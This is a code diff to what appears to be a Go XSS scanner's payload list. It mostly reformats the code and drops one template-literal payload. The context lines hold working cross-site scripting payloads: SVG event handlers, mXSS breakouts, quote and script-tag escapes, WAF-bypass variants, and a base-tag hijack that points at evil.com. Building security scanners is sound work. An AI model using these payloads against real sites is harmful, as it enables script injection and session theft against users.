@@ -6,10 +6,10 @@ import (
 )
 
 type PayloadTemplate struct {
-	Value        string
-	Context      context.ContextType
-	Severity     model.Severity
-	Desc     string
+	Value         string
+	Context       context.ContextType
+	Severity      model.Severity
+	Desc          string
 	WAFBypassOnly bool // true = only used when --waf-bypass is enabled
 }
 
@@ -65,7 +65,7 @@ var payloadTemplates = map[context.ContextType][]PayloadTemplate{
 		{Value: `<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>`, Severity: model.High, Desc: "mXSS via foreignObject breakout"},
 		// Advanced SVG event handlers
 		{Value: `<svg><a><animate onbegin=alert(1) attributeName=x dur=1s>`, Severity: model.High, Desc: "SVG animate via <a> element"},
-		{Value: `<svg onload="setTimeout`+`alert(1)">`, Severity: model.High, Desc: "SVG onload setTimeout"},
+		{Value: `<svg onload="setTimeout` + `alert(1)">`, Severity: model.High, Desc: "SVG onload setTimeout"},
 		// Base tag hijacking
 		{Value: `<base href="//evil.com/"><script src="/cdn.js"></script>`, Severity: model.High, Desc: "Base tag CDN hijack"},
 		// Service Worker injection (stored XSS vector)
@@ -123,7 +123,6 @@ var payloadTemplates = map[context.ContextType][]PayloadTemplate{
 		{Value: `';alert(1)//`, Severity: model.High, Desc: "Single quote breakout"},
 		{Value: `"-alert(1)-"`, Severity: model.High, Desc: "Double quote template literal"},
 		{Value: `\\';alert(1)//`, Severity: model.High, Desc: "Escaped quote breakout"},
-		{Value: `${alert(1)}`, Severity: model.High, Desc: "Template literal injection"},
 		{Value: `';eval('alert(1)')//`, Severity: model.High, Desc: "Eval via string breakout"},
 		{Value: `</script><script>alert(1)</script>`, Severity: model.High, Desc: "Script tag breakout"},
 		// DOM sinks via JS breakout
